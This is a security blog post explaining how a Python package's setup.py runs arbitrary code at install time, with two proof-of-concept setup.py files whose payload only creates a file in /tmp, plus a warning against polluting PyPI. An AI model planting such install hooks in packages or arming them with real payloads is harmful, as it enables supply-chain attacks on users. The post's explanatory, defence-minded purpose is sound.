<!doctype html><html lang=en><head><title>Executing Code on Python Package Installs - Malicious Pypi &ndash; wooper blog</title>
<meta name=description content="very serious intellectual thoughts /s"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous><link rel=stylesheet href=https://blog.kazam.io/css/colour/wooper.css><link rel=stylesheet href=https://blog.kazam.io/css/colour/wooper-mode.css><link rel=stylesheet href=https://blog.kazam.io/css/risotto.css><link rel=stylesheet href=https://blog.kazam.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://blog.kazam.io class=page__logo-inner>wooper blog</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class=nav-main-item href=/notes/ title=Notes>Notes</a></li><li class=main-nav__item><a class="nav-main-item active" href=/posts/ title=Posts>Posts</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Executing Code on Python Package Installs - Malicious Pypi</h1></header><div class=content__body><br><h1 id=foreword>Foreword</h1><p>Multiple researchers in the community have given dependency confusion and other supply chain attacks a bad name recently. While there are very valid reasons to perform this attack, please do not pollute pypi or any other package manager with typosquatting, stolen code, or other non-targetted attacks in the name of security research. It&rsquo;s no different than spreading malware. The point has been made. Please be responsible.</p><h1 id=executing-code-on-package-install>Executing code on package install</h1><p>While most python packages are distributed as wheels, the <a href=https://packaging.python.org/en/latest/specifications/binary-distribution-format/>&ldquo;binary&rdquo; distribution format</a>, Pypi also enables developers to distribute their package as <a href=https://packaging.python.org/en/latest/specifications/source-distribution-format/>source distributions</a> (or sdist). The sdist allows developers to suply the source code as the distribution such that the code is compiled into a wheel by the distutils/setuptools module on the system that installs it by calling the setup.py script that is bundled into the sdist. This will also occur even if the module if the module is downloaded via <code>pip download</code>.</p><p>As the setup.py script is supplied by the developer, it is easy to hook parts of distutils and supply your own code instead. Most examples use the built-in <code>cmdclass</code> parameter on the setup function to hook a specific command given to setup.py. Here is an example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> setuptools <span style=color:#f92672>import</span> setup
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> setuptools.command.install <span style=color:#f92672>import</span> install
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>bad_stuff</span>():
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;touch /tmp/bad_stuff&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HookedInstallClass</span>(install):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>run</span>(self):
</span></span><span style=display:flex><span>        install<span style=color:#f92672>.</span>run(self)
</span></span><span style=display:flex><span>        bad_stuff()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>setup(
</span></span><span style=display:flex><span>    name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;malicious&#39;</span>,
</span></span><span style=display:flex><span>    version<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.1&#39;</span>,
</span></span><span style=display:flex><span>    description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Execute Code On Install&#39;</span>,
</span></span><span style=display:flex><span>    author<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Example Author&#39;</span>,
</span></span><span style=display:flex><span>    author_email<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;fake@email.com&#39;</span>,
</span></span><span style=display:flex><span>    long_description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>    long_description_content_type<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;text/markdown&#39;</span>,
</span></span><span style=display:flex><span>    url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;https://github.com/pypa/sampleproject&#39;</span>,
</span></span><span style=display:flex><span>    packages<span style=color:#f92672>=</span>[],
</span></span><span style=display:flex><span>    license<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;GPLv3&#39;</span>,
</span></span><span style=display:flex><span>    classifiers<span style=color:#f92672>=</span>[
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Environment :: Console&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;License :: OSI Approved :: GNU General Public License v3 (GPLv3)&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Operating System :: MacOS :: MacOS X&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Operating System :: POSIX&#39;</span>,
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    install_requires<span style=color:#f92672>=</span>[],
</span></span><span style=display:flex><span>    tests_require<span style=color:#f92672>=</span>[],
</span></span><span style=display:flex><span>    cmdclass<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;install&#39;</span>: HookedInstallClass,
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>You can try this out by simply writing it to a setup.py file in a new directory and running <code>python setup.py install</code></p><p>Actually bundling and publishing this code is as easy as <code>python setup.py sdist</code> and then uploading it via twine. <a href=https://docs.python.org/3/distutils/setupscript.html>See the docs here.</a></p><h1 id=without-hooking>Without hooking</h1><p>It&rsquo;s also worth noting that although most examples are hooking other functions using cmdclass in the end python is just running the script you supply and you can get as creative with it as you want. You may still want to keep the setup call however if you would like your module to build and install correctly. The following example will execute code every time setup.py is executed, including when you use it to generate the sdist.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> setuptools <span style=color:#f92672>import</span> setup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>bad_stuff</span>():
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;touch /tmp/bad_stuff&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>setup(
</span></span><span style=display:flex><span>    name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;malicious&#39;</span>,
</span></span><span style=display:flex><span>    version<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.1&#39;</span>,
</span></span><span style=display:flex><span>    description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Execute Code On Install&#39;</span>,
</span></span><span style=display:flex><span>    author<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Example Author&#39;</span>,
</span></span><span style=display:flex><span>    author_email<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;fake@email.com&#39;</span>,
</span></span><span style=display:flex><span>    long_description<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>    long_description_content_type<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;text/markdown&#39;</span>,
</span></span><span style=display:flex><span>    url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;https://github.com/pypa/sampleproject&#39;</span>,
</span></span><span style=display:flex><span>    packages<span style=color:#f92672>=</span>[],
</span></span><span style=display:flex><span>    license<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;GPLv3&#39;</span>,
</span></span><span style=display:flex><span>    classifiers<span style=color:#f92672>=</span>[
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Environment :: Console&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;License :: OSI Approved :: GNU General Public License v3 (GPLv3)&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Operating System :: MacOS :: MacOS X&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Operating System :: POSIX&#39;</span>,
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    install_requires<span style=color:#f92672>=</span>[],
</span></span><span style=display:flex><span>    tests_require<span style=color:#f92672>=</span>[],
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bad_stuff()
</span></span></code></pre></div><h1 id=why-is-this-allowed>Why is this allowed?</h1><blockquote><p>These are useful for end users wanting to develop your sources, and for end user systems where some local compilation step is required (such as a C extension).</p></blockquote><p>There are many use cases where you might want to compile your code differently on a different machine, check attributes of the system, compile other languages, etc.</p><h1 id=other-thoughts>Other thoughts</h1><p>Attacks on package managers are increasingly being considered as low-effort high-reward opportunities for attackers in much the same way that Android apps and Chrome extensions have historically been abused to distribute malware. This is already becoming a popular attack, and package managers are a particularly soft target due to lack of their own anti-malware teams and permission models.</p><p>While it is difficult to prevent these attacks from occurring, it should be easy to detect this technique due to the requirements of a package being distributed as a .tar.gz file and the setup.py entry-point. I hope to see more research in this space.</p><p>Thanks to <a href=https://github.com/mschwager>mschwager</a> for his contributions as well, 0wned is a great example.</p><h1 id=links>Links</h1><br><ul><li><a href=https://thehackernews.com/2022/09/warning-pypi-feature-executes-code.html>https://thehackernews.com/2022/09/warning-pypi-feature-executes-code.html</a></li><li><a href=https://github.com/mschwager/0wned>https://github.com/mschwager/0wned</a></li></ul></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><img class=about__logo src=https://blog.kazam.io/static/sk8r-wooper.png alt=Logo><h1 class=about__title>wooper blog</h1><p class=about__description>very serious intellectual thoughts /s</p></div><ul class=aside__social-links><li><a href=https://github.com/evillogic rel=me aria-label=GitHub title=GitHub><i class="fab fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=mailto:evillogic1@gmail.com rel=me aria-label=Email title=Email><i class="fas fa-envelope" aria-hidden=true></i></a>&nbsp;</li><li><a href=#ZgotmplZ rel=me aria-label="Happy Hacking!" title="Happy Hacking!"><i class="ai ai-arxiv" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>2022-09-08</p></div></section><footer class=page__footer><p class=copyright>Â© 2024 Kaz Bishop</p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p><script defer language=javascript type=text/javascript src=/js/copy.js></script></footer></div></body></html>